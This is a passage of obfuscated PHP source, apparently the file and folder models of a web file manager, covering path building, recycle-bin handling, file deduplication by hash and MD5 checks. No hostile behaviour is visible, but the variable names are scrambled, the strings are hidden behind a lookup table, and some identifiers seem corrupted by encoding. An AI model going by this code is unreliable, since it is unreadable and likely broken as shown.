$šóÓĞ¯[$Û±ñòÃ”] = $„‡ØëåÁ; } } $äú’ÅÊ = USER_ID; $–Ñõ±ı¤ = array(); $¾ı¾Í = $this->_listAppendPath($–Ñõ±ı¤, !0); foreach ($¥ú¢É¶’ as $Û±ñòÃ” => &$„‡ØëåÁ) { if (!is_array($„‡ØëåÁ[$¦´¿Œø’[487]])) { continue; } if ($„‡ØëåÁ[$¦´¿Œø’[190]] != $¦´¿Œø’[578]) { continue; } if (isset($šóÓĞ¯[$„‡ØëåÁ[$¦´¿Œø’[193]]])) { $â‡ıÔ‹¢ = $šóÓĞ¯[$„‡ØëåÁ[$¦´¿Œø’[193]]]; if (!is_array($„‡ØëåÁ[$¦´¿Œø’[539]])) { $„‡ØëåÁ[$¦´¿Œø’[539]] = array(); } $„‡ØëåÁ[$¦´¿Œø’[539]][$¦´¿Œø’[579]] = $â‡ıÔ‹¢[$¦´¿Œø’[574]]; $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[580]] = $â‡ıÔ‹¢; $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[581]] = $„‡ØëåÁ[$¦´¿Œø’[582]]; $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[583]] = $¦´¿Œø’[91]; if ($â‡ıÔ‹¢[$¦´¿Œø’[527]] != $äú’ÅÊ) { $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[488]] = $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[488]] & $â‡ıÔ‹¢[$¦´¿Œø’[487]][$¦´¿Œø’[487]]; } continue; } $¯Ù¦ÜÆ¿ = $this->parentLevelArray($„‡ØëåÁ[$¦´¿Œø’[584]]); $Îªîõö = array_reverse($¯Ù¦ÜÆ¿); foreach ($Îªîõö as $û»Ë–’¿ => $ù‡ÖË„Ì) { if (!isset($šóÓĞ¯[$ù‡ÖË„Ì])) { continue; } $â‡ıÔ‹¢ = $šóÓĞ¯[$ù‡ÖË„Ì]; $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[580]] = $â‡ıÔ‹¢; if ($â‡ıÔ‹¢[$¦´¿Œø’[527]] != $äú’ÅÊ) { $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[488]] = $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[488]] & $â‡ıÔ‹¢[$¦´¿Œø’[487]][$¦´¿Œø’[487]]; } $çô¬Ã¼Ú = $¦´¿Œø’[12]; $Ï—œé × = count($¯Ù¦ÜÆ¿) - $û»Ë–’¿; for ($Ú»”ÊÔÆ = 0; $Ú»”ÊÔÆ < $Ï—œé ×; $Ú»”ÊÔÆ++) { if (!isset($¾ı¾Í[$¯Ù¦ÜÆ¿[$Ú»”ÊÔÆ]])) { $çô¬Ã¼Ú = $¦´¿Œø’[12]; break; } $çô¬Ã¼Ú = $çô¬Ã¼Ú . rtrim($¾ı¾Í[$¯Ù¦ÜÆ¿[$Ú»”ÊÔÆ]], $¦´¿Œø’[8]) . $¦´¿Œø’[8]; } $„‡ØëåÁ[$¦´¿Œø’[487]][$¦´¿Œø’[581]] = rtrim($çô¬Ã¼Ú, $¦´¿Œø’[8]) . $¦´¿Œø’[8]; break; } } unset($„‡ØëåÁ); } public function groupPathDisplay(&$Äâö˜³À) { $±Ä¤­‘Î =& $_SERVER[óÔë„ú]; if ($Äâö˜³À[$±Ä¤­‘Î[190]] != self::TYPE_GROUP) { return; } $áÙÆ‰‚É = Model($±Ä¤­‘Î[585])->getInfo($Äâö˜³À[$±Ä¤­‘Î[569]]); $õş½œ¨ = $this->parentLevelArray($áÙÆ‰‚É[$±Ä¤­‘Î[584]]); $³‡±ëù = $±Ä¤­‘Î[12]; foreach ($õş½œ¨ as $¯÷øÆÚş) { $œ¨³şı = Model($±Ä¤­‘Î[585])->getInfo($¯÷øÆÚş); $³‡±ëù .= $œ¨³şı[$±Ä¤­‘Î[90]][$±Ä¤­‘Î[193]] . $±Ä¤­‘Î[50]; } $Äâö˜³À[$±Ä¤­‘Î[586]] = $áÙÆ‰‚É[$±Ä¤­‘Î[192]]; $Äâö˜³À[$±Ä¤­‘Î[587]] = $áÙÆ‰‚É[$±Ä¤­‘Î[584]]; $Äâö˜³À[$±Ä¤­‘Î[588]] = $áÙÆ‰‚É[$±Ä¤­‘Î[589]]; $Äâö˜³À[$±Ä¤­‘Î[590]] = $³‡±ëù . $áÙÆ‰‚É[$±Ä¤­‘Î[90]][$±Ä¤­‘Î[193]]; } protected function _listAppendPath(&$ïòÚÜíÜ, $Ô´Ï¡ª = false) { $Å±ÓÈÒ­ =& $_SERVER[óÔë„ú]; static $„Ëşâ¯× = array(); $„ –¶Î = array(); $ƒĞáà¦ö = array(); if ($Ô´Ï¡ª) { return $„Ëşâ¯×; } foreach ($ïòÚÜíÜ as &$÷…Åø…) { $á³…×ìê = $÷…Åø…[$Å±ÓÈÒ­[193]]; if ($÷…Åø…[$Å±ÓÈÒ­[485]] == $Å±ÓÈÒ­[91] && $÷…Åø…[$Å±ÓÈÒ­[192]] != 0) { $„Ëşâ¯×[$á³…×ìê] = $÷…Åø…[$Å±ÓÈÒ­[32]]; } if ($÷…Åø…[$Å±ÓÈÒ­[485]] == $Å±ÓÈÒ­[91] && $÷…Åø…[$Å±ÓÈÒ­[192]] == 0) { $„Ëşâ¯×[$á³…×ìê] = $this->_listAppendPathRoot($÷…Åø…, array()); } if (isset($ƒĞáà¦ö[$÷…Åø…[$Å±ÓÈÒ­[584]]])) { continue; } $ƒĞáà¦ö[$÷…Åø…[$Å±ÓÈÒ­[584]]] = !0; $û‡™ñ¿ï = $this->parentLevelArray($÷…Åø…[$Å±ÓÈÒ­[584]]); foreach ($û‡™ñ¿ï as $£¥Ù–¤Ù => $±âÅŠš) { if (isset($„Ëşâ¯×[$±âÅŠš])) { continue; } if ($£¥Ù–¤Ù == 0) { $„Ëşâ¯×[$±âÅŠš] = $this->_listAppendPathRoot($÷…Åø…, $û‡™ñ¿ï); } if ($£¥Ù–¤Ù != 0) { $„ –¶Î[] = $±âÅŠš; } } } unset($÷…Åø…); $„ –¶Î = array_unique($„ –¶Î); if (count($„ –¶Î) > 0) { $é·÷€¸ˆ = array($Å±ÓÈÒ­[491] => array($Å±ÓÈÒ­[492], $„ –¶Î)); if (count($„ –¶Î) == 1) { $Ÿø§®˜§ = $this->sourceInfo($„ –¶Î[0]); $Åšæ¸¶ = is_array($Ÿø§®˜§) ? array($Ÿø§®˜§) : !1; } else { $Åšæ¸¶ = $this->field($Å±ÓÈÒ­[591])->where($é·÷€¸ˆ)->select(); } if (!$Åšæ¸¶) { $Åšæ¸¶ = array(); } foreach ($Åšæ¸¶ as $ÂØ”½ƒ ) { $„Ëşâ¯×[$ÂØ”½ƒ [$Å±ÓÈÒ­[193]]] = $ÂØ”½ƒ [$Å±ÓÈÒ­[32]]; } } $¸ÌÉîì¬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¯ğÙô¼Ğ = array(); foreach ($ïòÚÜíÜ as &$÷…Åø…) { $†ÔõÖÀ = $÷…Åø…[$Å±ÓÈÒ­[584]]; $Ä©¨´úÌ = $Å±ÓÈÒ­[12]; if (isset($¯ğÙô¼Ğ[$†ÔõÖÀ])) { $Ä©¨´úÌ = $¯ğÙô¼Ğ[$†ÔõÖÀ]; } else { $û‡™ñ¿ï = $this->parentLevelArray($÷…Åø…[$Å±ÓÈÒ­[584]]); foreach ($û‡™ñ¿ï as $£¥Ù–¤Ù => $±âÅŠš) { if (isset($„Ëşâ¯×[$±âÅŠš])) { $Ä©¨´úÌ .= $„Ëşâ¯×[$±âÅŠš] . $Å±ÓÈÒ­[8]; } } $¯ğÙô¼Ğ[$†ÔõÖÀ] = $Ä©¨´úÌ; } $Ä©¨´úÌ .= $÷…Åø…[$Å±ÓÈÒ­[32]]; if ($÷…Åø…[$Å±ÓÈÒ­[485]] == $Å±ÓÈÒ­[91]) { $Ä©¨´úÌ .= $Å±ÓÈÒ­[8]; } $÷…Åø…[$Å±ÓÈÒ­[582]] = str_replace($Å±ÓÈÒ­[592], $Å±ÓÈÒ­[8], $Ä©¨´úÌ); if ($÷…Åø…[$Å±ÓÈÒ­[192]] == $Å±ÓÈÒ­[228]) { $÷…Åø…[$Å±ÓÈÒ­[32]] = trim($„Ëşâ¯×[$÷…Åø…[$Å±ÓÈÒ­[193]]], $Å±ÓÈÒ­[8]); $÷…Åø…[$Å±ÓÈÒ­[582]] = $÷…Åø…[$Å±ÓÈÒ­[32]] . $Å±ÓÈÒ­[8]; } if (intval($÷…Åø…[$Å±ÓÈÒ­[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($÷…Åø…, $û‡™ñ¿ï, $¸ÌÉîì¬); } } unset($÷…Åø…); return $ïòÚÜíÜ; } private function _listAppendPathRecycle(&$ù‹ª»áè, $İôŞëö—, $ã‘´§ºë) { $´ÕÙÉÃä =& $_SERVER[óÔë„ú]; if (!in_array($ã‘´§ºë, $İôŞëö—) && $ù‹ª»áè[$´ÕÙÉÃä[193]] != $ã‘´§ºë) { return; } $©Ê‰«Ğ = explode($´ÕÙÉÃä[8], trim($ù‹ª»áè[$´ÕÙÉÃä[582]], $´ÕÙÉÃä[8])); $Éš‡ü¹á = implode($´ÕÙÉÃä[8], array_slice($©Ê‰«Ğ, 2)); $ù‹ª»áè[$´ÕÙÉÃä[582]] = $´ÕÙÉÃä[8] . LNG($´ÕÙÉÃä[593]) . $´ÕÙÉÃä[8] . ltrim($Éš‡ü¹á, $´ÕÙÉÃä[8]); $ù‹ª»áè[$´ÕÙÉÃä[584]] = $´ÕÙÉÃä[594] . implode($´ÕÙÉÃä[50], array_slice($İôŞëö—, 1)) . $´ÕÙÉÃä[50]; if ($ù‹ª»áè[$´ÕÙÉÃä[193]] == $ã‘´§ºë) { $ù‹ª»áè[$´ÕÙÉÃä[584]] = $´ÕÙÉÃä[594]; $ù‹ª»áè[$´ÕÙÉÃä[192]] = $´ÕÙÉÃä[228]; $ù‹ª»áè[$´ÕÙÉÃä[32]] = LNG($´ÕÙÉÃä[593]); } $ù‹ª»áè[$´ÕÙÉÃä[595]] = $´ÕÙÉÃä[596]; } protected function _listAppendPathRoot(&$š”Ì‹², $ßÎª”ì) { $Ú€ÖÏ¬ =& $_SERVER[óÔë„ú]; static $Úğ²šÅ = false; $ÒúŒ¦¶Ú = $Ú€ÖÏ¬[12]; if ($š”Ì‹²[$Ú€ÖÏ¬[190]] == self::TYPE_USER) { if ($š”Ì‹²[$Ú€ÖÏ¬[569]] == USER_ID) { $ÒúŒ¦¶Ú = LNG($Ú€ÖÏ¬[597]); if ($Úğ²šÅ === !1) { $Û¯Éæ»« = Model($Ú€ÖÏ¬[598])->getInfoFull(USER_ID); $Úğ²šÅ = _get($Û¯Éæ»«, $Ú€ÖÏ¬[599], $Ú€ÖÏ¬[12]); } if ($ßÎª”ì && $ßÎª”ì[0] == $Úğ²šÅ || !$ßÎª”ì && $š”Ì‹²[$Ú€ÖÏ¬[193]] == $Úğ²šÅ) { $ÒúŒ¦¶Ú = LNG($Ú€ÖÏ¬[600]); $š”Ì‹²[$Ú€ÖÏ¬[601]] = $Ú€ÖÏ¬[602]; } if (!$ßÎª”ì) { $š”Ì‹²[$Ú€ÖÏ¬[32]] = $ÒúŒ¦¶Ú; } } else { $š”Ì‹²[$Ú€ÖÏ¬[603]] = Model($Ú€ÖÏ¬[577])->getInfoSimpleOuter($š”Ì‹²[$Ú€ÖÏ¬[569]]); $ÒúŒ¦¶Ú = LNG($Ú€ÖÏ¬[604]) . $Ú€ÖÏ¬[176] . $š”Ì‹²[$Ú€ÖÏ¬[603]][$Ú€ÖÏ¬[32]] . $Ú€ÖÏ¬[178]; } } else { if ($š”Ì‹²[$Ú€ÖÏ¬[190]] == self::TYPE_GROUP) { $í„İ¨²Ú = Model($Ú€ÖÏ¬[585])->getInfoSimple($š”Ì‹²[$Ú€ÖÏ¬[569]]); $ÒúŒ¦¶Ú = $í„İ¨²Ú[$Ú€ÖÏ¬[32]]; } else { if ($š”Ì‹²[$Ú€ÖÏ¬[190]] == self::TYPE_SYSTEM) { $ÒúŒ¦¶Ú = $Ú€ÖÏ¬[605]; } } } $ÒúŒ¦¶Ú = $ÒúŒ¦¶Ú ? $Ú€ÖÏ¬[8] . $ÒúŒ¦¶Ú . $Ú€ÖÏ¬[8] : $Ú€ÖÏ¬[8]; return $ÒúŒ¦¶Ú; } protected function _listAppendUser(&$çÖÅ³šš) { $ÆğºÈ½– =& $_SERVER[óÔë„ú]; $ÄØ‡³ç = array_to_keyvalue($çÖÅ³šš, $ÆğºÈ½–[12], $ÆğºÈ½–[527]); $ƒ¨Á™õã = array_to_keyvalue($çÖÅ³šš, $ÆğºÈ½–[12], $ÆğºÈ½–[529]); $£‹¦Êú± = array_merge($ÄØ‡³ç, $ƒ¨Á™õã); $¹«ßŸ…´ = Model($ÆğºÈ½–[598])->userListInfo($£‹¦Êú±); foreach ($çÖÅ³šš as &$¯ş ±–…) { $ÛôÕû— = $¯ş ±–…[$ÆğºÈ½–[527]]; $¯ş ±–…[$ÆğºÈ½–[527]] = $¹«ßŸ…´[$ÛôÕû—] ? $¹«ßŸ…´[$ÛôÕû—] : !1; $ÛôÕû— = $¯ş ±–…[$ÆğºÈ½–[529]]; $¯ş ±–…[$ÆğºÈ½–[529]] = $¹«ßŸ…´[$ÛôÕû—] ? $¹«ßŸ…´[$ÛôÕû—] : !1; if (_get($¯ş ±–…, $ÆğºÈ½–[606], 0)) { $±’è½‰› = $GLOBALS[$ÆğºÈ½–[6]][$ÆğºÈ½–[92]][$ÆğºÈ½–[607]]; if ($¯ş ±–…[$ÆğºÈ½–[539]][$ÆğºÈ½–[608]] <= time() - $±’è½‰›) { $this->metaSet($¯ş ±–…[$ÆğºÈ½–[193]], $ÆğºÈ½–[609], null); $this->metaSet($¯ş ±–…[$ÆğºÈ½–[193]], $ÆğºÈ½–[608], null); unset($¯ş ±–…[$ÆğºÈ½–[539]][$ÆğºÈ½–[609]]); continue; } $î›ËÍ›ß = $¯ş ±–…[$ÆğºÈ½–[539]][$ÆğºÈ½–[609]]; $¯ş ±–…[$ÆğºÈ½–[539]][$ÆğºÈ½–[610]] = Model($ÆğºÈ½–[598])->getInfoSimpleOuter($î›ËÍ›ß); } } unset($¯ş ±–…); } public function parentLevelArray($¸š–Š·„) { $ÚÂÕ¦ôÛ =& $_SERVER[óÔë„ú]; $¸š–Š·„ = explode($ÚÂÕ¦ôÛ[50], trim($¸š–Š·„, $ÚÂÕ¦ôÛ[50])); return array_remove_value($¸š–Š·„, $ÚÂÕ¦ôÛ[228]); } public function listAll($şëˆ¶æ) { $È¶Ãèêñ =& $_SERVER[óÔë„ú]; $åª¡ÓáÆ = $this->sourceInfo($şëˆ¶æ); $ãÖáªÂì = array($È¶Ãèêñ[611] => array($È¶Ãèêñ[612], $åª¡ÓáÆ[$È¶Ãèêñ[584]] . $şëˆ¶æ . $È¶Ãèêñ[613]), $È¶Ãèêñ[614] => 0); $ÈÂïí = $È¶Ãèêñ[615]; $ÆòıÛÛµ = "\x4c\105\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x69\157\137\146\151\x6c\x65\40\146\x69\154\145\x20\157\x6e\x20\163\157\x75\x72\x63\x65\x2e\146\x69\x6c\x65\x49\x44\40\x3d\40\146\151\x6c\145\56\x66\x69\154\145\111\104"; $ÜÒò™°¾ = $this->alias($È¶Ãèêñ[519])->field($ÈÂïí)->where($ãÖáªÂì)->join($ÆòıÛÛµ)->select(); $this->_listAppendAuth($ÜÒò™°¾); $this->_listAppendUser($ÜÒò™°¾); $this->_listAppendPath($ÜÒò™°¾); $ÜÒò™°¾ = array_to_keyvalue($ÜÒò™°¾, $È¶Ãèêñ[193]); $½ß¹Óñ = "\x2f{$åª¡ÓáÆ[$È¶Ãèêñ[32]]}\57"; $½ß¹Óñ = $½ß¹Óñ == $È¶Ãèêñ[592] ? $È¶Ãèêñ[8] : $½ß¹Óñ; $ˆá‡·ˆ¸ = array(); foreach ($ÜÒò™°¾ as $€Ê·ğ§ => $³á¯·¸) { $ãµ°ïÊ = $this->parentLevelArray($³á¯·¸[$È¶Ãèêñ[584]]); array_shift($ãµ°ïÊ); $ò£ø¾½ì = $½ß¹Óñ; for ($Ç˜ïáÃø = 0; $Ç˜ïáÃø < count($ãµ°ïÊ); $Ç˜ïáÃø++) { $ò£ø¾½ì .= $ÜÒò™°¾[$ãµ°ïÊ[$Ç˜ïáÃø]][$È¶Ãèêñ[32]] . $È¶Ãèêñ[8]; } $ò£ø¾½ì .= $³á¯·¸[$È¶Ãèêñ[32]]; if ($³á¯·¸[$È¶Ãèêñ[485]]) { $ò£ø¾½ì .= $È¶Ãèêñ[8]; } $ã×¡°â = array($È¶Ãèêñ[495] => str_replace($È¶Ãèêñ[592], $È¶Ãèêñ[8], str_replace($È¶Ãèêñ[592], $È¶Ãèêñ[8], str_replace($È¶Ãèêñ[592], $È¶Ãèêñ[8], $ò£ø¾½ì))), $È¶Ãèêñ[616] => intval($³á¯·¸[$È¶Ãèêñ[485]]), $È¶Ãèêñ[617] => intval($³á¯·¸[$È¶Ãèêñ[79]]), $È¶Ãèêñ[88] => intval($³á¯·¸[$È¶Ãèêñ[88]]), $È¶Ãèêñ[90] => $this->pathInfoFilter($³á¯·¸)); if (!$ã×¡°â[$È¶Ãèêñ[485]]) { $ã×¡°â[$È¶Ãèêñ[541]] = $³á¯·¸[$È¶Ãèêñ[541]]; } $ˆá‡·ˆ¸[] = $ã×¡°â; } $ˆá‡·ˆ¸ = array_sort_by($ˆá‡·ˆ¸, $È¶Ãèêñ[87]); return $ˆá‡·ˆ¸; } } goto b­Æ×…àÎÁ; f£Èˆ¯½ë: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\x6c\145\x5f\143\x6f\156\x74\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\x69\155\145", "\x74\151\155\145", "\x69\156\x73\x65\162\164", "\x66\165\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\x6d\x65" => "\151\157\x5f\146\x69\x6c\145\137\x6d\145\x74\141", "\x6d\145\164\141\106\151\145\x6c\x64" => "\x66\x69\x6c\145\111\104"); public function fileInfo($„úÛÛÁÒ) { $ĞùŒ– =& $_SERVER[óÔë„ú]; static $Û†ÍÁÀ® = array(); if (!isset($Û†ÍÁÀ®[$„úÛÛÁÒ])) { $øÚè–ÁÎ = $ĞùŒ–[2007]; $ı²÷¶´ = Model($ĞùŒ–[544])->field($øÚè–ÁÎ)->where(array($ĞùŒ–[542] => $„úÛÛÁÒ))->find(); $Û†ÍÁÀ®[$„úÛÛÁÒ] = $ı²÷¶´; } return $Û†ÍÁÀ®[$„úÛÛÁÒ]; } public function addFileByContent($‹Şš´ = '', $”˜øñ„Ç = '') { $ÙâÍëŸÍ =& $_SERVER[óÔë„ú]; $ÑÉËÄğö = TEMP_PATH . $ÙâÍëŸÍ[2008]; if (!is_dir($ÑÉËÄğö)) { mk_dir($ÑÉËÄğö); } $ÌÊ×Èó˜ = $ÑÉËÄğö . $ÙâÍëŸÍ[2009] . rand_string(16); file_put_contents($ÌÊ×Èó˜, $‹Şš´); $ş££ªú– = $this->addFile($ÌÊ×Èó˜, $”˜øñ„Ç, !0); if (file_exists($ÌÊ×Èó˜)) { @unlink($ÌÊ×Èó˜); } return $ş££ªú–; } public function createFileName($§Ü®Ã¬, $¾‹Ö¡Ø³ = false, $Üª¤ = false) { $–ëÏ­¥Å =& $_SERVER[óÔë„ú]; $Ôµ¦‰ş‡ = IO::init($–ëÏ­¥Å[8]); $× ê®Ó‹ = $this->makeFilePath($§Ü®Ã¬, $Ôµ¦‰ş‡, $¾‹Ö¡Ø³, $Üª¤); $Á¬Ö™—• = $Ôµ¦‰ş‡->pathFather($× ê®Ó‹); static $´’Å€ÇÉ = false; $³Ñ•¶ìÒ = $–ëÏ­¥Å[2010] . md5($Á¬Ö™—•); if (!$´’Å€ÇÉ && !Cache::get($³Ñ•¶ìÒ)) { $´’Å€ÇÉ = !0; $ÅÓ¨õ = IO::mkdir($Á¬Ö™—•); if (!IO::exist($ÅÓ¨õ . $–ëÏ­¥Å[857])) { IO::mkfile($ÅÓ¨õ . $–ëÏ­¥Å[857]); } Cache::set($³Ñ•¶ìÒ, 1, 3600 * 2); } return $× ê®Ó‹; } public function makeFilePath($ºß¢, $¹­£µ·©, $şíşÙ›Ë = false, $›À½¯ª‡ = false) { $¨ÌÃî²Ø =& $_SERVER[óÔë„ú]; $€º“˜ÜÂ = Model($¨ÌÃî²Ø[830])->get($¨ÌÃî²Ø[2011]); $“ñ‹íãŸ = KodIO::defaultIO() . date($¨ÌÃî²Ø[2012]); $Ôã«¯ = $“ñ‹íãŸ . rand_string(5) . short_id(100); $ºß¢ = str_replace($¨ÌÃî²Ø[8], $¨ÌÃî²Ø[11], KodIO::clear($ºß¢)); $Ÿ¿º·•· = $¹­£µ·©->ext($ºß¢); if (!$ºß¢) { $€º“˜ÜÂ = $¨ÌÃî²Ø[836]; } switch ($€º“˜ÜÂ) { case $¨ÌÃî²Ø[2013]: if ($Ÿ¿º·•·) { $Ôã«¯ = $Ôã«¯ . $¨ÌÃî²Ø[10] . $Ÿ¿º·•·; } if ($Ÿ¿º·•· == $¨ÌÃî²Ø[1949]) { $Ôã«¯ .= $¨ÌÃî²Ø[1278]; } break; case $¨ÌÃî²Ø[2014]: $»¸®ú  = Model($¨ÌÃî²Ø[830])->get($¨ÌÃî²Ø[831]); $ñÍñü = substr(md5($¨ÌÃî²Ø[832] . $»¸®ú  . date($¨ÌÃî²Ø[809])), 0, 8); $À³¬Ë† = KodIO::defaultDriver(); $“ñ‹íãŸ = $¨ÌÃî²Ø[1309] . $À³¬Ë†[$¨ÌÃî²Ø[475]] . $¨ÌÃî²Ø[484] . date($¨ÌÃî²Ø[2015]) . $ñÍñü . $¨ÌÃî²Ø[8]; if ($Ÿ¿º·•· == $¨ÌÃî²Ø[1949]) { $ºß¢ .= $¨ÌÃî²Ø[1278]; } $íşÎôúâ = $¨ÌÃî²Ø[2016] . $“ñ‹íãŸ . $ºß¢; CacheLock::lock($íşÎôúâ); $Ôã«¯ = $“ñ‹íãŸ . $ºß¢; if (IO::exist($“ñ‹íãŸ . $ºß¢)) { $Šó‡Í‚ğ = substr($ºß¢, 0, strlen($ºß¢) - strlen($Ÿ¿º·•·)); $—¿‚Âõ´ = $›À½¯ª‡ ? substr($›À½¯ª‡, 0, 5) : ($şíşÙ›Ë ? substr($şíşÙ›Ë, 0, 5) : rand_string(5)); $Ôã«¯ = $“ñ‹íãŸ . $Šó‡Í‚ğ . $—¿‚Âõ´; if ($Ÿ¿º·•·) { $Ôã«¯ = $Ôã«¯ . $¨ÌÃî²Ø[10] . $Ÿ¿º·•·; } } if (IO::isOsDriver($Ôã«¯) && !IO::isUploadServer($Ôã«¯)) { if (IO::exist($Ôã«¯)) { return $Ôã«¯; } $‹¸¹Õš = IO::setContent($Ôã«¯, $¨ÌÃî²Ø[12]); if (!$‹¸¹Õš) { show_json($¨ÌÃî²Ø[2017], !1); } } CacheLock::unlock($íşÎôúâ); break; case $¨ÌÃî²Ø[836]: break; default: break; } return $Ôã«¯; } public function addFileByRemote($¾¿ığ§¡, $¡ç”êÒŞ, $æ¿µ‰¾´ = array()) { $©ßöÄ‹Ø =& $_SERVER[óÔë„ú]; if (!IO::exist($¾¿ığ§¡)) { return !1; } $´³ÍŸò = $æ¿µ‰¾´[$©ßöÄ‹Ø[547]] ? $æ¿µ‰¾´[$©ßöÄ‹Ø[547]] : $©ßöÄ‹Ø[12]; $ëô¤ù¾â = IO::hashMd5($¾¿ığ§¡, $´³ÍŸò); $ç®êàÍÊ = KodIO::defaultDriver(); $ÃÖîöÒ = array($©ßöÄ‹Ø[617] => IO::size($¾¿ığ§¡), $©ßöÄ‹Ø[2018] => 1, $©ßöÄ‹Ø[494] => $¡ç”êÒŞ, $©ßöÄ‹Ø[868] => $ç®êàÍÊ[$©ßöÄ‹Ø[475]], $©ßöÄ‹Ø[495] => $¾¿ığ§¡, $©ßöÄ‹Ø[2019] => $æ¿µ‰¾´[$©ßöÄ‹Ø[672]] ? $æ¿µ‰¾´[$©ßöÄ‹Ø[672]] : IO::hashSimple($¾¿ığ§¡), $©ßöÄ‹Ø[2020] => $ëô¤ù¾â ? $ëô¤ù¾â : $´³ÍŸò); if ($ºœÖÚÉ– = $this->addFileCheckExist($ÃÖîöÒ[$©ßöÄ‹Ø[672]], $ÃÖîöÒ[$©ßöÄ‹Ø[547]], $ÃÖîöÒ[$©ßöÄ‹Ø[79]])) { return $ºœÖÚÉ–; } return $this->addFileData($ÃÖîöÒ); } private function addFileData($·º¾êïù) { $°œñÙı´ =& $_SERVER[óÔë„ú]; if (!$·º¾êïù) { return !1; } $·º¾êïù[$°œñÙı´[79]] = intval($·º¾êïù[$°œñÙı´[79]]); if (!$·º¾êïù[$°œñÙı´[79]] && strlen($·º¾êïù[$°œñÙı´[672]]) > 32) { $·º¾êïù[$°œñÙı´[79]] = intval(substr($·º¾êïù[$°œñÙı´[672]], 32)); } $»»ßöØ = $this->add($·º¾êïù); return $this->find($»»ßöØ); } public function addFile($„¼ Ğ´, $’ç¾’†®, $ËçáÜ = false) { $‘Â Ñ =& $_SERVER[óÔë„ú]; $°É˜Çª¦ = IO::hashSimple($„¼ Ğ´); $ı¦¥…Ô = IO::size($„¼ Ğ´); $‹¤ÚÎ = $ı¦¥…Ô <= 1024 * 1024 * 10 ? IO::hashMd5($„¼ Ğ´) : $‘Â Ñ[12]; $¯É¯æÌ· = $‘Â Ñ[2021] . $°É˜Çª¦; CacheLock::lock($¯É¯æÌ·); if ($‹¤ÚÎ && $°É˜Çª¦) { $æİ€Ø‰‰ = $this->addFileCheckExist($°É˜Çª¦, $‹¤ÚÎ, $ı¦¥…Ô); if ($æİ€Ø‰‰) { CacheLock::unlock($¯É¯æÌ·); return $æİ€Ø‰‰; } } $Í†šÂÔé = $this->addFileMake($„¼ Ğ´, $ı¦¥…Ô, $°É˜Çª¦, $‹¤ÚÎ, $’ç¾’†®, $ËçáÜ); $ÄÚ£Üşå = $this->addFileData($Í†šÂÔé); CacheLock::unlock($¯É¯æÌ·); if (!$‹¤ÚÎ && $ÄÚ£Üşå) { $this->fileMd5Check($ÄÚ£Üşå); } return $ÄÚ£Üşå; } public function fileMd5Check($˜ÖõŞß£) { $Êü˜ÉÑ =& $_SERVER[óÔë„ú]; $Ã¸İ²áÆ = array($˜ÖõŞß£[$Êü˜ÉÑ[541]], $˜ÖõŞß£[$Êü˜ÉÑ[87]]); $¿¬Œ÷¿š = $Êü˜ÉÑ[2022] . $˜ÖõŞß£[$Êü˜ÉÑ[87]]; $¥‰øÂ‡ = $Êü˜ÉÑ[2023] . $˜ÖõŞß£[$Êü˜ÉÑ[541]]; TaskQueue::add($Êü˜ÉÑ[2024], $Ã¸İ²áÆ, $¿¬Œ÷¿š, $¥‰øÂ‡); } public function fileMd5Set($ÉşÏÈ²†, $‚ˆÕÃâï) { $ÁŸúØş =& $_SERVER[óÔë„ú]; $ƒ«£´ƒ = $this->find($ÉşÏÈ²†); if (!$ƒ«£´ƒ || $ƒ«£´ƒ[$ÁŸúØş[547]]) { return; } $»›ëÕë’ = IO::hashMd5($‚ˆÕÃâï); if (!$»›ëÕë’) { return $ÁŸúØş[12]; } $this->where(array($ÁŸúØş[541] => $ÉşÏÈ²†))->save(array($ÁŸúØş[547] => $»›ëÕë’)); } public function addFileMake($¹ô®²”‘, $Ìâ¦êÖê, $®ÇöíşÑ, $Ç½óÓİ, $¼‹Ã€Ï¶, $ĞŞÏÅÄô) { $µª¨‹å¶ =& $_SERVER[óÔë„ú]; $ü¤²­éá = $this->createFileName($¼‹Ã€Ï¶, $®ÇöíşÑ, $Ç½óÓİ); $Ê«¦Æ‹¥ = get_path_father($ü¤²­éá); $áÕ€åÈ§ = get_path_this($ü¤²­éá); if ($ĞŞÏÅÄô) { $‚ç“¡ûÈ = IO::move($¹ô®²”‘, $Ê«¦Æ‹¥, !1, $áÕ€åÈ§); } else { $‚ç“¡ûÈ = IO::copy($¹ô®²”‘, $Ê«¦Æ‹¥, !1, $áÕ€åÈ§); } if (!$‚ç“¡ûÈ) { return !1; } $ë¥Ç™ÌÃ = KodIO::defaultDriver(); $åØâ‰» = array($µª¨‹å¶[617] => $Ìâ¦êÖê, $µª¨‹å¶[2018] => 1, $µª¨‹å¶[494] => $¼‹Ã€Ï¶, $µª¨‹å¶[868] => $ë¥Ç™ÌÃ[$µª¨‹å¶[475]], $µª¨‹å¶[495] => $ü¤²­éá, $µª¨‹å¶[2019] => $®ÇöíşÑ, $µª¨‹å¶[2020] => $Ç½óÓİ); return $åØâ‰»; } public function addFileCheckExist($ã›¿‚şô, $ŒäÅú–ä, $Ëã‚õ”¯) { $Òµ¶Ë‚¼ =& $_SERVER[óÔë„ú]; $Ô—ÛåÚÌ = $this->findByHash($ã›¿‚şô, $ŒäÅú–ä); if (!$Ô—ÛåÚÌ) { return !1; } $Î×£—·Ÿ = array($Òµ¶Ë‚¼[2018] => intval($Ô—ÛåÚÌ[$Òµ¶Ë‚¼[2025]]) + 1, $Òµ¶Ë‚¼[617] => $Ëã‚õ”¯); $this->where(array($Òµ¶Ë‚¼[542] => $Ô—ÛåÚÌ[$Òµ¶Ë‚¼[541]]))->save($Î×£—·Ÿ); return $Ô—ÛåÚÌ; } public function 